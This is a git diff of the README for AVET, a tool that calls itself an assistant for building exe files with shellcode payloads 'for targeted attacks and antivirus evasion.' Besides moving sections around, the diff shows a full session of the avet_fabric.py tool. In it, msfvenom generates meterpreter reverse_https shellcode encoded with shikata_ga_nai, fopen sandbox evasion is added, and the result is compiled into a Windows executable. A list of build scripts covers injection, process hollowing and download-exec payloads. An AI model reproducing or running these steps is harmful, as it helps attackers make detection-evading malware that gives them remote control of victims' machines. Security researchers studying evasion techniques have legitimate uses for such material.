@@ -17,7 +17,7 @@ What & Why:
 - more techniques can be used now, such as shellcode injection, process hollowing and more
 - most payloads can be deliverd from a file, the network or command line
 - the payload can be encrypted with a key, the key can be delivered like payloads
-- this readme applies for Kali 2018.x (64bit) and tdm-gcc
+- this readme applies for Kali 2018.x (64bit) and tdm-gcc (should work on other Kali/Linux versions also)
 
 Installation
 ------------
@@ -52,6 +52,10 @@ root@kalidan:~/tools/avet# ./build/build_win32_meterpreter_rev_https_50xshikata_
 ```
 
 You can define default LHOST and LPORT values for metasploit payloads in the `/build/global_connect_config.sh` file, which are used if you don't redefine in your current build script.
+
+__Warning__
+
+Before executing build scripts, ensure that your msf database is started up and initialized. If you don't, msfvenom will be hesitant to launch and your build script execution will get stuck!
 
 
 Usage examples
@@ -90,9 +94,6 @@ Below, find a list of all currently provided build scripts. The names should hin
 For detailed information, consider the comments inside the scripts.
 Feel free to modify/write your own build scripts to build your custom executable!
 
-__Warning__
-
-Before executing build scripts, ensure that your msf database is started up and initialized. If you don't, msfvenom will be hesitant to launch and your build script execution will get stuck!
 
 ```
 buildsvc_win32_meterpreter_bind_tcp_20xshikata.sh
@@ -124,6 +125,129 @@ build_win64_meterpreter_rev_https_xor_downloadexecshellcode.sh
 build_win64_meterpreter_rev_https_xor_fopen.sh
 ```
 
+**However, it is strongly recommended to use the avet_fabric.py! It makes the tool easier to use.**
+
+The fabric provides a more convenient interface on the command line, where you can choose which build script you want to use.
+It also gives you the opportunity to alter build scripts on the fly (see below).
+
+The latter is especially useful as you can define new LHOST and LPORT variables for msfvenom each time you run a build script via the fabric.
+You can define default LHOST and LPORT values in the `/build/global_connect_config.sh` file, which are used if you don't redefine.
+
+Here's a quick example (python3 || gtfo):
+```
+python3 avet_fabric.py
+
+                       .|        ,       +
+             *         | |      ((             *
+                       |'|       `    ._____
+         +     ___    |  |   *        |.   |' .---"|
+       _    .-'   '-. |  |     .--'|  ||   | _|    |
+    .-'|  _.|  |    ||   '-__  |   |  |    ||      |
+    |' | |.    |    ||       | |   |  |    ||      |
+ ___|  '-'     '    ""       '-'   '-.'    '`      |____
+jgs~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+AVET Fabric by Daniel Sauder, Florian Saager
+
+avet_fabric.py is an assistant for building exe files with shellcode payloads for targeted attacks and antivirus evasion.
+
+0: build_win32_meterpreter_rev_https_shikata_fopen.sh
+1: build_win32_meterpreter_rev_https_shikata_fopen_avet_encoding.sh
+2: buildsvc_win32_meterpreter_bind_tcp_20xshikata.sh
+3: build_win32_meterpreter_rev_https_50xshikata_quiet.sh
+4: build_win32_meterpreter_rev_https_shikata_raw_loadfile.sh
+5: build_win32_meterpreter_rev_https_ASCIIMSF_cmd.sh
+6: build_win64_meterpreter_rev_https_xor_downloadexecshellcode.sh
+7: build_win32_meterpreter_rev_https_shikata_downloadexecshellcode.sh
+8: build_win32_shell_rev_tcp_shikata_fopen_kaspersky.sh
+9: build_win32_meterpreter_rev_https_ASCIIMSF.sh
+10: build_win32_meterpreter_rev_https_killswitch_shikata.sh
+11: build_win32_exec_calc_injectdll_target_cmd.sh
+12: build_win32_meterpreter_rev_https_shikata_download_powershell_raw_loadfile.sh
+13: build_win32_meterpreter_rev_https_shikata_download_certutil_raw_loadfile.sh
+14: build_win32_meterpreter_rev_https_50xshikata.sh
+15: build_win64_meterpreter_rev_https_xor_fopen.sh
+16: build_win32_meterpreter_rev_https_shikata_loadfile.sh
+17: build_win32_meterpreter_unstaged_rev_https_40xshikata.sh
+18: build_win32_meterpreter_rev_https_shikata_downloadexecshellcode_DKMC.sh
+19: build_win64_exec_calc_injectdll_target_cmd.sh
+20: build_win32_meterpreter_rev_tcp_hollowing_target_cmd.sh
+21: build_win64_meterpreter_rev_https_xor_avet.sh
+22: build_win64_meterpreter_rev_https_injectshellcode_target_cmd.sh
+23: build_win32_meterpreter_rev_https_fopen_shikata_quiet.sh
+24: build_win32_meterpreter_rev_https_shikata_load_ie.sh
+25: build_win64_meterpreter_rev_https_hollowing_target_cmd.sh
+26: build_win32_meterpreter_rev_tcp_injectshellcode_target_cmd.sh
+Input number of the script you want use and hit enter: 0
+
+Now you can edit the build script line by line.
+
+Apply shikata and perform fopen sandbox evasion.
+print AVET logo
+$ cat banner.txt
+include script containing the compiler var $win32_compiler
+you can edit the compiler in build/global_win32.sh
+or enter $win32_compiler="mycompiler" here
+$ . build/global_win32.sh
+import feature construction interface
+$ . build/feature_construction.sh
+import global default lhost and lport values from build/global_connect_config.sh
+$ . build/global_connect_config.sh
+override connect-back settings here, if necessary
+$ LPORT=$GLOBAL_LPORT
+$ LHOST=$GLOBAL_LHOST
+generate payload and call avet
+$ msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > input/sc_c.txt
+add fopen sandbox evasion
+$ add_evasion fopen_sandbox_evasion
+set shellcode source
+$ set_payload_source static_from_file input/sc_c.txt
+set decoder and key source
+$ set_decoder none
+$ set_key_source none
+set payload info source
+$ set_payload_info_source none
+set shellcode binding technique
+$ set_payload_execution_method exec_shellcode
+enable debug output
+$ enable_debug_print
+compile
+$ $win32_compiler -o output/output.exe source/avet.c
+$ strip output/output.exe
+cleanup
+$ cleanup_techniques
+
+The following commands will be executed:
+#/bin/bash
+cat banner.txt
+. build/global_win32.sh
+. build/feature_construction.sh
+. build/global_connect_config.sh
+LPORT=$GLOBAL_LPORT
+LHOST=$GLOBAL_LHOST
+msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > input/sc_c.txt
+add_evasion fopen_sandbox_evasion
+set_payload_source static_from_file input/sc_c.txt
+set_decoder none
+set_key_source none
+set_payload_info_source none
+set_payload_execution_method exec_shellcode
+enable_debug_print
+$win32_compiler -o output/output.exe source/avet.c
+strip output/output.exe
+cleanup_techniques
+
+Press enter to continue.
+
+Building the output file...
+
+Please stand by...
+
+The output file should be placed in the current directory.
+
+Bye...
+```
+
 
 Features
 --------
@@ -150,6 +274,7 @@ Drops the downloaded file to disk before reading the data.
 ##### download_internet_explorer
 Downloads data from a specified URL, using Internet Explorer.
 Drops the downloaded file to disk before reading the data.
+Included for historical reasons.
 
 ##### download_powershell
 Downloads data from a specified URI via powershell.
@@ -345,108 +470,6 @@ Domain : ARBEITSGRUPPE
 Logged On Users : 2
 Meterpreter : x86/windows
 ```
-
-
-Easier use: avet_fabric.py
-=============
-**However, it is strongly recommended to use the avet_fabric.py! It makes the tool easier to use.**
-
-The fabric provides a more convenient interface on the command line, where you can choose which build script you want to use.
-It also gives you the opportunity to alter build scripts on the fly (see below).
-
-The latter is especially useful as you can define new LHOST and LPORT variables for msfvenom each time you run a build script via the fabric.
-You can define default LHOST and LPORT values in the `/build/global_connect_config.sh` file, which are used if you don't redefine.
-
-Here's a quick example (python3 || gtfo):
-```
-python3 avet_fabric.py 
-
-                       .|        ,       +
-             *         | |      ((             *
-                       |'|       `    ._____
-         +     ___    |  |   *        |.   |' .---"|
-       _    .-'   '-. |  |     .--'|  ||   | _|    |
-    .-'|  _.|  |    ||   '-__  |   |  |    ||      |
-    |' | |.    |    ||       | |   |  |    ||      |
- ___|  '-'     '    ""       '-'   '-.'    '`      |____
-jgs~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
-AVET Fabric by Daniel Sauder, Florian Saager
-
-avet_fabric.py is an assistant for building exe files with shellcode payloads for targeted attacks and antivirus evasion.
-
-0: build_win32_meterpreter_rev_https_shikata_fopen.sh
-1: build_win32_meterpreter_rev_https_fopen_shikata.sh
-2: buildsvc_win32_meterpreter_bind_tcp_20xshikata.sh
-3: build_win32_meterpreter_rev_https_50xshikata_quiet.sh
-4: build_win32_meterpreter_rev_https_shikata_raw_loadfile.sh
-5: build_win32_meterpreter_rev_https_ASCIIMSF_cmd.sh
-6: build_win32_meterpreter_rev_https_shikata_downloadexecshellcode.sh
-7: build_win32_shell_rev_tcp_shikata_fopen_kaspersky.sh
-8: build_win32_meterpreter_rev_https_ASCIIMSF.sh
-9: build_win32_meterpreter_rev_https_killswitch_shikata.sh
-10: build_win32_meterpreter_rev_https_shikata_download_powershell_raw_loadfile.sh
-11: build_win32_meterpreter_rev_https_shikata_load_ie_debug.sh
-12: build_win32_meterpreter_rev_https_shikata_download_certutil_raw_loadfile.sh
-13: build_win32_meterpreter_rev_https_50xshikata.sh
-14: build_win32_meterpreter_rev_https_shikata_loadfile.sh
-15: build_win32_meterpreter_unstaged_rev_https_40xshikata.sh
-16: build_win32_meterpreter_rev_https_shikata_downloadexecshellcode_DKMC.sh
-17: build_win32_meterpreter_rev_https_fopen_shikata_quiet.sh
-18: build_win64_meterpreter_rev_tcp_xor.sh
-19: build_win32_meterpreter_rev_https_shikata_load_ie.sh
-20: build_win64_meterpreter_rev_tcp_xor_downloadexecshellcode.sh
-21: build_win64_meterpreter_rev_tcp_xor_fopen.sh
-Input number of the script you want use and hit enter: 0
-
-Now you can edit the build script line by line.
-
-simple example script for building the .exe file
-include script containing the compiler var $win32_compiler
-you can edit the compiler in build/global_win32.sh
-or enter $win32_compiler="mycompiler" here
-$ . build/global_win32.sh
-import global default lhost and lport values from build/global_connect_config.sh
-$ . build/global_connect_config.sh
-override connect-back settings here, if necessary
-$ LPORT=$GLOBAL_LPORT
-$ LHOST=$GLOBAL_LHOST
-make meterpreter reverse payload, encoded with shikata_ga_nai
-additionaly to the avet encoder, further encoding should be used
-$ msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
-format the shellcode for make_avet
-$ ./format.sh sc.txt > scclean.txt && rm sc.txt
-call make_avet, the -f compiles the shellcode to the exe file, the -F is for the AV sandbox evasion
-$ ./make_avet -f scclean.txt -F -E
-compile to pwn.exe file
-$ $win32_compiler -o pwn.exe avet.c
-cleanup
-$ rm scclean.txt && echo "" > defs.h
-
-The following commands will be executed:
-#/bin/bash
-. build/global_win32.sh
-. build/global_connect_config.sh
-LPORT=$GLOBAL_LPORT
-LHOST=$GLOBAL_LHOST
-msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
-./format.sh sc.txt > scclean.txt && rm sc.txt
-./make_avet -f scclean.txt -F -E
-$win32_compiler -o pwn.exe avet.c
-rm scclean.txt && echo "" > defs.h
-
-Press enter to continue.
-
-Building the output file...
-
-Please stand by...
-
-The output file should be placed in the current directory.
-
-Bye...
-
-```
-
 
 More
 ====
